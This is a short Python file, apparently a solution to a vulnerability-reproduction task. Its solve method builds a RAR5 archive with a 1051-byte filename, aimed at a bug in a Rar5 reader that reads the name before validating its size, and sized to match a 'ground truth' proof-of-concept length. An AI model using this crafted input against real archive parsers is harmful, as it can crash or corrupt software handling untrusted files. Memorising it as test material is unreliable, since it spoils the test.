import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability in the Rar5 reader involves reading the name size, 
        allocating memory, and then reading the name before fully validating the size.
        This PoC constructs a valid RAR5 archive structure with a File Header 
        containing a filename that is long enough to cross internal buffer boundaries (approx 1KB),
        which triggers the vulnerable code path.
        """
        # RAR5 Signature
        signature = b"\x52\x61\x72\x21\x1a\x07\x01\x00"

        def to_vint(n):
            out = bytearray()
            while n > 0x7F:
                out.append((n & 0x7F) | 0x80)
                n >>= 7
            out.append(n)
            return bytes(out)

        # 1. Main Header (Type 1)
        # Structure: CRC(4) + Size(vint) + Type(vint) + Flags(vint) + ArchFlags(vint)
        mh_type = b'\x01'
        mh_flags = b'\x00'
        mh_arch_flags = b'\x00'
        
        mh_body = mh_type + mh_flags + mh_arch_flags
        mh_size = to_vint(len(mh_body))
        
        # CRC is calculated over Size + Body
        mh_crc_data = mh_size + mh_body
        mh_crc = struct.pack('<I', zlib.crc32(mh_crc_data) & 0xFFFFFFFF)
        mh_block = mh_crc + mh_crc_data

        # 2. File Header (Type 2)
        # Structure: CRC(4) + Size(vint) + Type(vint) + Flags(vint) + [FileFlags, USize, Attr, Comp, OS, NameLen, Name]
        # We use a name length of 1051 bytes. This length combined with header overhead
        # results in a total PoC size close to 1089 bytes (ground truth), and crosses 
        # the 1024-byte boundary which is often significant in buffer processing.
        name_len = 1051
        name = b'A' * name_len
        
        fh_type = b'\x02'
        fh_flags = b'\x00' 
        fh_file_flags = b'\x00' 
        fh_unpacked_size = b'\x00'
        fh_attributes = b'\x00'
        fh_comp_info = b'\x00'
        fh_host_os = b'\x00'
        fh_name_len = to_vint(name_len)
        
        fh_body = (fh_type + fh_flags + fh_file_flags + fh_unpacked_size + 
                   fh_attributes + fh_comp_info + fh_host_os + fh_name_len + name)
        fh_size = to_vint(len(fh_body))
        
        fh_crc_data = fh_size + fh_body
        fh_crc = struct.pack('<I', zlib.crc32(fh_crc_data) & 0xFFFFFFFF)
        fh_block = fh_crc + fh_crc_data

        # 3. End Header (Type 5)
        # Structure: CRC(4) + Size(vint) + Type(vint) + Flags(vint)
        eh_type = b'\x05'
        eh_flags = b'\x00'
        
        eh_body = eh_type + eh_flags
        eh_size = to_vint(len(eh_body))
        
        eh_crc_data = eh_size + eh_body
        eh_crc = struct.pack('<I', zlib.crc32(eh_crc_data) & 0xFFFFFFFF)
        eh_block = eh_crc + eh_crc_data

        return signature + mh_block + fh_block + eh_block